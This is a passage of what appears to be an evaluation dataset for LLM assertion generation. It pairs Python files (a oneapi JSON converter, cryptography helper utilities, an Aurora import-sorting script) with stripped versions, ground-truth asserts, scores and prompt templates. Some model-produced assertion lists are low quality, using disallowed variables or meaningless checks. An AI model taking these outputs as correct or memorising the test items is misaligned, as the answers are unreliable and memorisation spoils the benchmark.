*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['json_field_name', 'self.json_field_name', 'self.object_field_name', 'value', 'where', 'self.where', 'parts', 'classs', 'self.classs', 'values', 'result', 'models', 'model_class', 'attribute_values', 'attribute_value.json_field_name', 'attribute_value.object_field_name', 'obj', 'json', 'is_error', 'obj.exception', 'attribute_value', 'object_field_name', 'converted', 'json_value', 'exception', 'class_attribute_value']
*Code:

1# -*- coding: utf-8 -*-
2
3import pdb
4
5import logging as mod_logging
6import json as mod_json
7
8import oneapi.utils as mod_utils
9
10class FieldConverter:
11
12    def __init__(self, json_field_name=None):
13        self.json_field_name = json_field_name
14
15        # Filled later while registering the model:
16        self.object_field_name = None
17
18    def from_json(self, value):
19        return value
20
21    def to_json(self, value):
22        return value
23
24class GetPartsOfUrlFieldConverter(FieldConverter):
25
26    def __init__(self, json_field_name=None, where=-1):
27        FieldConverter.__init__(self, json_field_name=json_field_name)
28        self.where = where
29
30    def from_json(self, value):
31        if value == None:
32            return None
33
34        parts = value.split('/')
35
36        if ((self.where >= 0 and self.where < len(parts)) or  (self.where < 0 and -self.where > len(parts))):
37                return None
38
39        return parts[self.where]
40
41    def to_json(self, value):
42        return value
43
44class ObjectFieldConverter(FieldConverter):
45
46    def __init__(self, classs, json_field_name=None):
47        FieldConverter.__init__(self, json_field_name=json_field_name)
48        self.classs = classs
49
50    def from_json(self, value):
51        if value == None:
52            return None
53
54        return Conversions.from_json(self.classs, value, is_error=False)
55
56    def to_json(self, value):
57        return Conversions.to_json(value)
58
59class ObjectsListFieldConverter(FieldConverter):
60
61    def __init__(self, classs, json_field_name=None):
62        FieldConverter.__init__(self, json_field_name=json_field_name)
63        self.classs = classs
64
65    def from_json(self, values):
66        if not values:
67            return []
68
69        result = []
70
71        for value in values:
72            result.append(Conversions.from_json(self.classs, value, is_error=False))
73
74        return result
75
76    def to_json(self, value):
77        # TODO
78        pass
79
80# ----------------------------------------------------------------------------------------------------
81
82class Models:
83
84    models = []
85
86    @staticmethod
87    def register(model_class):
88        """""" Registers metadata for object<->JSON conversion """"""
89
90        Models.models.append(model_class)
91        for attribute_name in dir(model_class):
92            if '_' != attribute_name[0]:
93                attribute_values = getattr(model_class, attribute_name)
94                if not isinstance(attribute_values, list):
95                    attribute_values = [attribute_values]
96
97                for attribute_value in attribute_values:
98                    if isinstance(attribute_value, FieldConverter):
99                        if not attribute_value.json_field_name:
100                            attribute_value.json_field_name = attribute_name
101                        if not attribute_value.object_field_name:
102                            attribute_value.object_field_name = attribute_name
103                        attribute_value.object_field_name = attribute_name
104
105    @staticmethod
106    def is_registered(model_class):
107        return model_class in Models.models
108
109# ----------------------------------------------------------------------------------------------------
110
111class Conversions:
112
113    @staticmethod
114    def fill_from_json(obj, json, is_error=False):
115        """""" Fill existing objects with JSON data. """"""
116
117        import oneapi.models as mod_models
118
119        if isinstance(json, str) or isinstance(json, unicode):
120            json = mod_json.loads(json)
121
122
123        if is_error:
124            obj.exception = Conversions.from_json(mod_models.OneApiError, json, False)
125        else:
126            for attribute_name in dir(obj.__class__):
127                attribute_value = getattr(obj.__class__, attribute_name)
128                object_field_name = None
129                converted = None
130                if isinstance(attribute_value, FieldConverter):
131                    object_field_name = attribute_value.object_field_name
132                    json_field_name = attribute_value.json_field_name
133                    json_value = mod_utils.get(json, json_field_name)
134                    converted = attribute_value.from_json(json_value)
135
136                    if object_field_name:
137                        if isinstance(converted, unicode):
138                            converted = converted.encode('utf-8')
139                        setattr(obj, object_field_name, converted)
140
141        return obj
142
143    @staticmethod
144    def from_json(classs, json, is_error=False):
145        """""" Create a new object converted from JSON data. """"""
146
147        if isinstance(json, str) or isinstance(json, unicode):
148            json = mod_json.loads(json)
149
150
151        result = classs()
152
153        Conversions.fill_from_json(result, json, is_error)
154
155        return result
156
157    @staticmethod
158    def to_json(obj):
159
160        pass
161
162# ----------------------------------------------------------------------------------------------------
163
164class AbstractModel:
165
166    exception = None
167
168    def __init__(self):
169        if not Models.is_registered(self.__class__):
170            Models.register(self.__class__)
171
172        # reset class attributes for this instance:
173        for class_attribute in dir(self.__class__):
174            class_attribute_value = getattr(self.__class__, class_attribute)
175            if isinstance(class_attribute_value, FieldConverter):
176                setattr(self, class_attribute, None)
177
178    def is_success(self):
179        return self.exception == None
180
181    def __str__(self):
182        result = '[{0}:'.format(self.__class__.__name__)
183
184        for attr in dir(self):
185            value = getattr(self, attr)
186            if '_' != attr[0] and not callable(value):
187                result += ':{0}={1}'.format(attr, value)
188
189        return result + ']'
190
191",7999,"Here are the assertions for the provided code:

[[16, 'self.object_field_name', '==', None, 'self.object_field_name must be None initially'],
 [26, 'where', '>=', -1, 'where must be greater than or equal to -1'],
 [36, 'parts', '>=', 0, 'parts should be greater than or equal to 0'],
 [34, 'value', '!=', None, 'value should not be None'],
 [61, 'classs', '!=', None, 'classs should not be None'],
 [77, 'value', '!=', None, 'value should not be None'],
 [88, 'model_class', '!=', None, 'model_class shouldn not be None'],
 [93, 'attribute_name', '!=', '_', 'attribute_name should not start with underscore'],
 [104, 'attribute_value.object_field_name', '==', 'attribute_name', 'attribute_value.object_field_name should be equal to attribute_name'],
 [114, 'obj', '!=', None, 'obj should not be None'],
 [114, 'json', '!=', None, 'json should not be None'],
 [130, 'object_field_name', '!=', None, 'object_field_name should not be None'],
 [130, 'json_field_name', '!=', None, 'json_field_name should not be None'],
 [134, 'json_value', '!=', None, 'json_value should not be None'],
 [144, 'classs', '!=', None, 'classs should not be None'],
 [147, 'json', '!=', None, 'json should not be None'],
 [169, 'self.__class__', '!=', None, 'self.__class__ should not be None']]"
zooba/PTVS,"# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.

from __future__ import absolute_import, division, print_function

import abc
import binascii
import inspect
import sys
import warnings


# We use a UserWarning subclass, instead of DeprecationWarning, because CPython
# decided deprecation warnings should be invisble by default.
class CryptographyDeprecationWarning(UserWarning):
    pass


# Several APIs were deprecated with no specific end-of-life date because of the
# ubiquity of their use. They should not be removed until we agree on when that
# cycle ends.
PersistentlyDeprecated2017 = CryptographyDeprecationWarning
PersistentlyDeprecated2018 = CryptographyDeprecationWarning
DeprecatedIn25 = CryptographyDeprecationWarning
DeprecatedIn27 = CryptographyDeprecationWarning


def _check_bytes(name, value):
    if not isinstance(value, bytes):
        raise TypeError(""{} must be bytes"".format(name))


def _check_byteslike(name, value):
    try:
        memoryview(value)
    except TypeError:
        raise TypeError(""{} must be bytes-like"".format(name))


def read_only_property(name):
    return property(lambda self: getattr(self, name))


def register_interface(iface):
    def register_decorator(klass):
        verify_interface(iface, klass)
        iface.register(klass)
        return klass
    return register_decorator


def register_interface_if(predicate, iface):
    def register_decorator(klass):
        if predicate:
            verify_interface(iface, klass)
            iface.register(klass)
        return klass
    return register_decorator


if hasattr(int, ""from_bytes""):
    int_from_bytes = int.from_bytes
else:
    def int_from_bytes(data, byteorder, signed=False):
        assert byteorder == 'big'
        assert not signed

        return int(binascii.hexlify(data), 16)


if hasattr(int, ""to_bytes""):
    def int_to_bytes(integer, length=None):
        return integer.to_bytes(
            length or (integer.bit_length() + 7) // 8 or 1, 'big'
        )
else:
    def int_to_bytes(integer, length=None):
        hex_string = '%x' % integer
        if length is None:
            n = len(hex_string)
        else:
            n = length * 2
        return binascii.unhexlify(hex_string.zfill(n + (n & 1)))


class InterfaceNotImplemented(Exception):
    pass


if hasattr(inspect, ""signature""):
    signature = inspect.signature
else:
    signature = inspect.getargspec


def verify_interface(iface, klass):
    for method in iface.__abstractmethods__:
        if not hasattr(klass, method):
            raise InterfaceNotImplemented(
                ""{} is missing a {!r} method"".format(klass, method)
            )
        if isinstance(getattr(iface, method), abc.abstractproperty):
            # Can't properly verify these yet.
            continue
        sig = signature(getattr(iface, method))
        actual = signature(getattr(klass, method))
        if sig != actual:
            raise InterfaceNotImplemented(
                ""{}.{}'s signature differs from the expected. Expected: ""
                ""{!r}. Received: {!r}"".format(
                    klass, method, sig, actual
                )
            )


# No longer needed as of 2.2, but retained because we have external consumers
# who use it.
def bit_length(x):
    return x.bit_length()


class _DeprecatedValue(object):
    def __init__(self, value, message, warning_class):
        self.value = value
        self.message = message
        self.warning_class = warning_class


class _ModuleWithDeprecations(object):
    def __init__(self, module):
        self.__dict__[""_module""] = module

    def __getattr__(self, attr):
        obj = getattr(self._module, attr)
        if isinstance(obj, _DeprecatedValue):
            warnings.warn(obj.message, obj.warning_class, stacklevel=2)
            obj = obj.value
        return obj

    def __setattr__(self, attr, value):
        setattr(self._module, attr, value)

    def __delattr__(self, attr):
        obj = getattr(self._module, attr)
        if isinstance(obj, _DeprecatedValue):
            warnings.warn(obj.message, obj.warning_class, stacklevel=2)

        delattr(self._module, attr)

    def __dir__(self):
        return [""_module""] + dir(self._module)


def deprecated(value, module_name, message, warning_class):
    module = sys.modules[module_name]
    if not isinstance(module, _ModuleWithDeprecations):
        sys.modules[module_name] = _ModuleWithDeprecations(module)
    return _DeprecatedValue(value, message, warning_class)


def cached_property(func):
    cached_name = ""_cached_{}"".format(func)
    sentinel = object()

    def inner(instance):
        cache = getattr(instance, cached_name, sentinel)
        if cache is not sentinel:
            return cache
        result = func(instance)
        setattr(instance, cached_name, result)
        return result
    return property(inner)
","
1# This file is dual licensed under the terms of the Apache License, Version
2# 2.0, and the BSD License. See the LICENSE file in the root of this repository
3# for complete details.
4
5from __future__ import absolute_import, division, print_function
6
7import abc
8import binascii
9import inspect
10import sys
11import warnings
12
13
14# We use a UserWarning subclass, instead of DeprecationWarning, because CPython
15# decided deprecation warnings should be invisble by default.
16class CryptographyDeprecationWarning(UserWarning):
17    pass
18
19
20# Several APIs were deprecated with no specific end-of-life date because of the
21# ubiquity of their use. They should not be removed until we agree on when that
22# cycle ends.
23PersistentlyDeprecated2017 = CryptographyDeprecationWarning
24PersistentlyDeprecated2018 = CryptographyDeprecationWarning
25DeprecatedIn25 = CryptographyDeprecationWarning
26DeprecatedIn27 = CryptographyDeprecationWarning
27
28
29def _check_bytes(name, value):
30    if not isinstance(value, bytes):
31        raise TypeError(""{} must be bytes"".format(name))
32
33
34def _check_byteslike(name, value):
35    try:
36        memoryview(value)
37    except TypeError:
38        raise TypeError(""{} must be bytes-like"".format(name))
39
40
41def read_only_property(name):
42    return property(lambda self: getattr(self, name))
43
44
45def register_interface(iface):
46    def register_decorator(klass):
47        verify_interface(iface, klass)
48        iface.register(klass)
49        return klass
50    return register_decorator
51
52
53def register_interface_if(predicate, iface):
54    def register_decorator(klass):
55        if predicate:
56            verify_interface(iface, klass)
57            iface.register(klass)
58        return klass
59    return register_decorator
60
61
62if hasattr(int, ""from_bytes""):
63    int_from_bytes = int.from_bytes
64else:
65    def int_from_bytes(data, byteorder, signed=False):
66
67        return int(binascii.hexlify(data), 16)
68
69
70if hasattr(int, ""to_bytes""):
71    def int_to_bytes(integer, length=None):
72        return integer.to_bytes(
73            length or (integer.bit_length() + 7) // 8 or 1, 'big'
74        )
75else:
76    def int_to_bytes(integer, length=None):
77        hex_string = '%x' % integer
78        if length is None:
79            n = len(hex_string)
80        else:
81            n = length * 2
82        return binascii.unhexlify(hex_string.zfill(n + (n & 1)))
83
84
85class InterfaceNotImplemented(Exception):
86    pass
87
88
89if hasattr(inspect, ""signature""):
90    signature = inspect.signature
91else:
92    signature = inspect.getargspec
93
94
95def verify_interface(iface, klass):
96    for method in iface.__abstractmethods__:
97        if not hasattr(klass, method):
98            raise InterfaceNotImplemented(
99                ""{} is missing a {!r} method"".format(klass, method)
100            )
101        if isinstance(getattr(iface, method), abc.abstractproperty):
102            # Can't properly verify these yet.
103            continue
104        sig = signature(getattr(iface, method))
105        actual = signature(getattr(klass, method))
106        if sig != actual:
107            raise InterfaceNotImplemented(
108                ""{}.{}'s signature differs from the expected. Expected: ""
109                ""{!r}. Received: {!r}"".format(
110                    klass, method, sig, actual
111                )
112            )
113
114
115# No longer needed as of 2.2, but retained because we have external consumers
116# who use it.
117def bit_length(x):
118    return x.bit_length()
119
120
121class _DeprecatedValue(object):
122    def __init__(self, value, message, warning_class):
123        self.value = value
124        self.message = message
125        self.warning_class = warning_class
126
127
128class _ModuleWithDeprecations(object):
129    def __init__(self, module):
130        self.__dict__[""_module""] = module
131
132    def __getattr__(self, attr):
133        obj = getattr(self._module, attr)
134        if isinstance(obj, _DeprecatedValue):
135            warnings.warn(obj.message, obj.warning_class, stacklevel=2)
136            obj = obj.value
137        return obj
138
139    def __setattr__(self, attr, value):
140        setattr(self._module, attr, value)
141
142    def __delattr__(self, attr):
143        obj = getattr(self._module, attr)
144        if isinstance(obj, _DeprecatedValue):
145            warnings.warn(obj.message, obj.warning_class, stacklevel=2)
146
147        delattr(self._module, attr)
148
149    def __dir__(self):
150        return [""_module""] + dir(self._module)
151
152
153def deprecated(value, module_name, message, warning_class):
154    module = sys.modules[module_name]
155    if not isinstance(module, _ModuleWithDeprecations):
156        sys.modules[module_name] = _ModuleWithDeprecations(module)
157    return _DeprecatedValue(value, message, warning_class)
158
159
160def cached_property(func):
161    cached_name = ""_cached_{}"".format(func)
162    sentinel = object()
163
164    def inner(instance):
165        cache = getattr(instance, cached_name, sentinel)
166        if cache is not sentinel:
167            return cache
168        result = func(instance)
169        setattr(instance, cached_name, result)
170        return result
171    return property(inner)
172","[['byteorder', '==', ""'big'""], ['signed', '==', 'False']]",2,2,1.0,0.0003992015968063,"['PersistentlyDeprecated2017', 'PersistentlyDeprecated2018', 'DeprecatedIn25', 'DeprecatedIn27', 'name', 'value', 'iface', 'klass', 'predicate', 'int_from_bytes', 'data', 'byteorder', 'signed', 'integer', 'length', 'hex_string', 'n', 'signature', 'sig', 'actual', 'x', 'message', 'warning_class', 'self.value', 'self.message', 'self.warning_class', 'module', 'self.__dict__[""_module""]', 'attr', 'obj', 'module_name', 'sys.modules[module_name]', 'func', 'cached_name', 'sentinel', 'instance', 'cache', 'result']",38,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['PersistentlyDeprecated2017', 'PersistentlyDeprecated2018', 'DeprecatedIn25', 'DeprecatedIn27', 'name', 'value', 'iface', 'klass', 'predicate', 'int_from_bytes', 'data', 'byteorder', 'signed', 'integer', 'length', 'hex_string', 'n', 'signature', 'sig', 'actual', 'x', 'message', 'warning_class', 'self.value', 'self.message', 'self.warning_class', 'module', 'self.__dict__[""_module""]', 'attr', 'obj', 'module_name', 'sys.modules[module_name]', 'func', 'cached_name', 'sentinel', 'instance', 'cache', 'result']
*Code:

1# This file is dual licensed under the terms of the Apache License, Version
2# 2.0, and the BSD License. See the LICENSE file in the root of this repository
3# for complete details.
4
5from __future__ import absolute_import, division, print_function
6
7import abc
8import binascii
9import inspect
10import sys
11import warnings
12
13
14# We use a UserWarning subclass, instead of DeprecationWarning, because CPython
15# decided deprecation warnings should be invisble by default.
16class CryptographyDeprecationWarning(UserWarning):
17    pass
18
19
20# Several APIs were deprecated with no specific end-of-life date because of the
21# ubiquity of their use. They should not be removed until we agree on when that
22# cycle ends.
23PersistentlyDeprecated2017 = CryptographyDeprecationWarning
24PersistentlyDeprecated2018 = CryptographyDeprecationWarning
25DeprecatedIn25 = CryptographyDeprecationWarning
26DeprecatedIn27 = CryptographyDeprecationWarning
27
28
29def _check_bytes(name, value):
30    if not isinstance(value, bytes):
31        raise TypeError(""{} must be bytes"".format(name))
32
33
34def _check_byteslike(name, value):
35    try:
36        memoryview(value)
37    except TypeError:
38        raise TypeError(""{} must be bytes-like"".format(name))
39
40
41def read_only_property(name):
42    return property(lambda self: getattr(self, name))
43
44
45def register_interface(iface):
46    def register_decorator(klass):
47        verify_interface(iface, klass)
48        iface.register(klass)
49        return klass
50    return register_decorator
51
52
53def register_interface_if(predicate, iface):
54    def register_decorator(klass):
55        if predicate:
56            verify_interface(iface, klass)
57            iface.register(klass)
58        return klass
59    return register_decorator
60
61
62if hasattr(int, ""from_bytes""):
63    int_from_bytes = int.from_bytes
64else:
65    def int_from_bytes(data, byteorder, signed=False):
66
67        return int(binascii.hexlify(data), 16)
68
69
70if hasattr(int, ""to_bytes""):
71    def int_to_bytes(integer, length=None):
72        return integer.to_bytes(
73            length or (integer.bit_length() + 7) // 8 or 1, 'big'
74        )
75else:
76    def int_to_bytes(integer, length=None):
77        hex_string = '%x' % integer
78        if length is None:
79            n = len(hex_string)
80        else:
81            n = length * 2
82        return binascii.unhexlify(hex_string.zfill(n + (n & 1)))
83
84
85class InterfaceNotImplemented(Exception):
86    pass
87
88
89if hasattr(inspect, ""signature""):
90    signature = inspect.signature
91else:
92    signature = inspect.getargspec
93
94
95def verify_interface(iface, klass):
96    for method in iface.__abstractmethods__:
97        if not hasattr(klass, method):
98            raise InterfaceNotImplemented(
99                ""{} is missing a {!r} method"".format(klass, method)
100            )
101        if isinstance(getattr(iface, method), abc.abstractproperty):
102            # Can't properly verify these yet.
103            continue
104        sig = signature(getattr(iface, method))
105        actual = signature(getattr(klass, method))
106        if sig != actual:
107            raise InterfaceNotImplemented(
108                ""{}.{}'s signature differs from the expected. Expected: ""
109                ""{!r}. Received: {!r}"".format(
110                    klass, method, sig, actual
111                )
112            )
113
114
115# No longer needed as of 2.2, but retained because we have external consumers
116# who use it.
117def bit_length(x):
118    return x.bit_length()
119
120
121class _DeprecatedValue(object):
122    def __init__(self, value, message, warning_class):
123        self.value = value
124        self.message = message
125        self.warning_class = warning_class
126
127
128class _ModuleWithDeprecations(object):
129    def __init__(self, module):
130        self.__dict__[""_module""] = module
131
132    def __getattr__(self, attr):
133        obj = getattr(self._module, attr)
134        if isinstance(obj, _DeprecatedValue):
135            warnings.warn(obj.message, obj.warning_class, stacklevel=2)
136            obj = obj.value
137        return obj
138
139    def __setattr__(self, attr, value):
140        setattr(self._module, attr, value)
141
142    def __delattr__(self, attr):
143        obj = getattr(self._module, attr)
144        if isinstance(obj, _DeprecatedValue):
145            warnings.warn(obj.message, obj.warning_class, stacklevel=2)
146
147        delattr(self._module, attr)
148
149    def __dir__(self):
150        return [""_module""] + dir(self._module)
151
152
153def deprecated(value, module_name, message, warning_class):
154    module = sys.modules[module_name]
155    if not isinstance(module, _ModuleWithDeprecations):
156        sys.modules[module_name] = _ModuleWithDeprecations(module)
157    return _DeprecatedValue(value, message, warning_class)
158
159
160def cached_property(func):
161    cached_name = ""_cached_{}"".format(func)
162    sentinel = object()
163
164    def inner(instance):
165        cache = getattr(instance, cached_name, sentinel)
166        if cache is not sentinel:
167            return cache
168        result = func(instance)
169        setattr(instance, cached_name, result)
170        return result
171    return property(inner)
172",7249,"[[29, 'value', '!=', None, ""value should not be None as it will raise TypeError""],
 [34, 'value', '!=', None, ""value should not be None as it will raise TypeError""],
 [51, 'iface', '!=', None, ""iface should not be None as it will raise Exception""],
 [51, 'klass', '!=', None, ""klass should not be None as it will raise Exception""],
 [63, 'int_from_bytes', '!=', None, ""int_from_bytes should not be None for the usage""],
 [65, 'data', '!=', None, ""data should not be None as it will raise Exception""],
 [71, 'integer', '!=', None, ""integer should not be None as it will raise Exception""],
 [76, 'integer', '!=', None, ""integer should not be None as it will raise Exception""],
 [95, 'iface', '!=', None, ""iface should not be None as it will raise Exception""],
 [95, 'klass', '!=', None, ""klass should not be None as it will raise Exception""],
 [117, 'x', '!=', None, ""x should not be None for bit_length function""],
 [122, 'value', '!=', None, ""_DeprecatedValue's value should not be None""],
 [122, 'message', '!=', None, ""_DeprecatedValue's message should not be None""],
 [122, 'warning_class', '!=', None, ""_DeprecatedValue's warning_class should not be None""],
 [129, 'module', '!=', None, ""_ModuleWithDeprecations's module should not be None""],
 [154, 'value', '!=', None, ""deprecated's value should not be None""],
 [154, 'module_name', '!=', None, ""module_name should not be None for deprecated function""],
 [154, 'message', '!=', None, ""deprecated's message should not be None""],
 [154, 'warning_class', '!=', None, ""deprecated's warning_class should not be None""],
 [160, 'func', '!=', None, ""func should not be None for cached_property function""]]"
rdelval/aurora,"#!/bin/env python
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

'''
Organizes a java source file's import statements in a way that pleases
Apache Aurora's checkstyle configuration.  This expects exactly one
argument: the name of the file to modify with preferred import ordering.
'''

from __future__ import print_function

import re
import sys
from collections import defaultdict

IMPORT_RE = re.compile('import(?: static)? (.*);')


def get_group(import_statement):
  matcher = IMPORT_RE.match(import_statement)
  assert matcher, 'Could not parse import statement: %s' % import_statement
  class_name = matcher.group(1)
  group = class_name.split('.')[0]
  return group


def index_by_group(import_statements):
  groups = defaultdict(list)
  for line in import_statements:
    groups[get_group(line)].append(line)
  return groups


IMPORT_CLASS_RE = re.compile(
    r'import(?: static)? (?P<outer>[^A-Z]*[A-Z]\w+)(?:\.(?P<inners>[\w][^;]*))?')


def get_all_group_lines(import_groups):
  if not import_groups:
    return []

  def get_group_lines(group):
    def comparator(x, y):
      # These shenanigans are used to properly order imports for inner classes.
      # So we get ordering like:
      # import com.foo.Bar;
      # import com.foo.Bar.Baz;
      # (this is not lexicographical, so normal sort won't suffice)
      x_m = IMPORT_CLASS_RE.match(x)
      y_m = IMPORT_CLASS_RE.match(y)
      if x_m.group('outer') == y_m.group('outer'):
        return cmp(x_m.group('inners'), y_m.group('inners'))
      else:
        return cmp(x, y)
    lines = sorted(import_groups[group], comparator)
    lines.append('')
    return lines

  all_lines = []
  explicit_groups = ['java', 'javax', 'scala', 'com', 'net', 'org']
  for group in explicit_groups:
    if group in import_groups:
      all_lines += get_group_lines(group)

  # Gather remaining groups.
  remaining_groups = sorted(set(import_groups.keys()) - set(explicit_groups))
  for group in remaining_groups:
    all_lines += get_group_lines(group)
  return all_lines


BEFORE_IMPORTS = 'before_imports'
IMPORTS = 'imports'
STATIC_IMPORTS = 'static_imports'
AFTER_IMPORTS = 'after_imports'


def main(argv):
  if len(argv) != 2:
    print('usage: %s FILE' % argv[0])
    sys.exit(1)

  print('Organizing imports in %s' % argv[1])
  lines_before_imports = []
  import_lines = []
  static_import_lines = []
  lines_after_imports = []
  with open(argv[1], 'r') as f:
    position = BEFORE_IMPORTS
    for line in f:
      line = line.rstrip()
      if position == BEFORE_IMPORTS:
        if line.startswith('import'):
          position = IMPORTS
        else:
          lines_before_imports.append(line)
      if position == IMPORTS:
        if line.startswith('import static'):
          position = STATIC_IMPORTS
        elif line.startswith('import'):
          import_lines.append(line)
        elif line.strip():
          position = AFTER_IMPORTS
      if position == STATIC_IMPORTS:
        if line.startswith('import static'):
          static_import_lines.append(line)
        elif line.strip():
          position = AFTER_IMPORTS
      if position == AFTER_IMPORTS:
        lines_after_imports.append(line)

  import_groups = index_by_group(import_lines)
  static_import_groups = index_by_group(static_import_lines)

  def ensure_line_padding(lines):
    if lines and lines[-1] != '':
      lines.append('')
    return lines

  file_lines = lines_before_imports
  if import_groups:
    ensure_line_padding(file_lines)
    file_lines += get_all_group_lines(import_groups)
  if static_import_groups:
    ensure_line_padding(file_lines)
    file_lines += get_all_group_lines(static_import_groups)
  if lines_after_imports:
    ensure_line_padding(file_lines)
    file_lines += lines_after_imports

  with open(argv[1], 'w') as f:
    for line in file_lines:
      print(line, file=f)


if __name__ == '__main__':
  main(sys.argv)
","
1#!/bin/env python
2#
3# Licensed under the Apache License, Version 2.0 (the ""License"");
4# you may not use this file except in compliance with the License.
5# You may obtain a copy of the License at
6#
7#     http://www.apache.org/licenses/LICENSE-2.0
8#
9# Unless required by applicable law or agreed to in writing, software
10# distributed under the License is distributed on an ""AS IS"" BASIS,
11# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
12# See the License for the specific language governing permissions and
13# limitations under the License.
14#
15
16'''
17Organizes a java source file's import statements in a way that pleases
18Apache Aurora's checkstyle configuration.  This expects exactly one
19argument: the name of the file to modify with preferred import ordering.
20'''
21
22from __future__ import print_function
23
24import re
25import sys
26from collections import defaultdict
27
28IMPORT_RE = re.compile('import(?: static)? (.*);')
29
30
31def get_group(import_statement):
32  matcher = IMPORT_RE.match(import_statement)
33  class_name = matcher.group(1)
34  group = class_name.split('.')[0]
35  return group
36
37
38def index_by_group(import_statements):
39  groups = defaultdict(list)
40  for line in import_statements:
41    groups[get_group(line)].append(line)
42  return groups
43
44
45IMPORT_CLASS_RE = re.compile(
46    r'import(?: static)? (?P<outer>[^A-Z]*[A-Z]\w+)(?:\.(?P<inners>[\w][^;]*))?')
47
48
49def get_all_group_lines(import_groups):
50  if not import_groups:
51    return []
52
53  def get_group_lines(group):
54    def comparator(x, y):
55      # These shenanigans are used to properly order imports for inner classes.
56      # So we get ordering like:
57      # import com.foo.Bar;
58      # import com.foo.Bar.Baz;
59      # (this is not lexicographical, so normal sort won't suffice)
60      x_m = IMPORT_CLASS_RE.match(x)
61      y_m = IMPORT_CLASS_RE.match(y)
62      if x_m.group('outer') == y_m.group('outer'):
63        return cmp(x_m.group('inners'), y_m.group('inners'))
64      else:
65        return cmp(x, y)
66    lines = sorted(import_groups[group], comparator)
67    lines.append('')
68    return lines
69
70  all_lines = []
71  explicit_groups = ['java', 'javax', 'scala', 'com', 'net', 'org']
72  for group in explicit_groups:
73    if group in import_groups:
74      all_lines += get_group_lines(group)
75
76  # Gather remaining groups.
77  remaining_groups = sorted(set(import_groups.keys()) - set(explicit_groups))
78  for group in remaining_groups:
79    all_lines += get_group_lines(group)
80  return all_lines
81
82
83BEFORE_IMPORTS = 'before_imports'
84IMPORTS = 'imports'
85STATIC_IMPORTS = 'static_imports'
86AFTER_IMPORTS = 'after_imports'
87
88
89def main(argv):
90  if len(argv) != 2:
91    print('usage: %s FILE' % argv[0])
92    sys.exit(1)
93
94  print('Organizing imports in %s' % argv[1])
95  lines_before_imports = []
96  import_lines = []
97  static_import_lines = []
98  lines_after_imports = []
99  with open(argv[1], 'r') as f:
100    position = BEFORE_IMPORTS
101    for line in f:
102      line = line.rstrip()
103      if position == BEFORE_IMPORTS:
104        if line.startswith('import'):
105          position = IMPORTS
106        else:
107          lines_before_imports.append(line)
108      if position == IMPORTS:
109        if line.startswith('import static'):
110          position = STATIC_IMPORTS
111        elif line.startswith('import'):
112          import_lines.append(line)
113        elif line.strip():
114          position = AFTER_IMPORTS
115      if position == STATIC_IMPORTS:
116        if line.startswith('import static'):
117          static_import_lines.append(line)
118        elif line.strip():
119          position = AFTER_IMPORTS
120      if position == AFTER_IMPORTS:
121        lines_after_imports.append(line)
122
123  import_groups = index_by_group(import_lines)
124  static_import_groups = index_by_group(static_import_lines)
125
126  def ensure_line_padding(lines):
127    if lines and lines[-1] != '':
128      lines.append('')
129    return lines
130
131  file_lines = lines_before_imports
132  if import_groups:
133    ensure_line_padding(file_lines)
134    file_lines += get_all_group_lines(import_groups)
135  if static_import_groups:
136    ensure_line_padding(file_lines)
137    file_lines += get_all_group_lines(static_import_groups)
138  if lines_after_imports:
139    ensure_line_padding(file_lines)
140    file_lines += lines_after_imports
141
142  with open(argv[1], 'w') as f:
143    for line in file_lines:
144      print(line, file=f)
145
146
147if __name__ == '__main__':
148  main(sys.argv)
149","[['matcher', '==', 'True']]",1,1,1.0,0.0002273243919072,"['IMPORT_RE', 'import_statement', 'matcher', 'class_name', 'group', 'import_statements', 'groups', 'IMPORT_CLASS_RE', 'import_groups', 'x', 'y', 'x_m', 'y_m', 'lines', 'all_lines', 'explicit_groups', 'remaining_groups', 'BEFORE_IMPORTS', 'IMPORTS', 'STATIC_IMPORTS', 'AFTER_IMPORTS', 'argv', 'lines_before_imports', 'import_lines', 'static_import_lines', 'lines_after_imports', 'position', 'line', 'static_import_groups', 'file_lines']",30,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
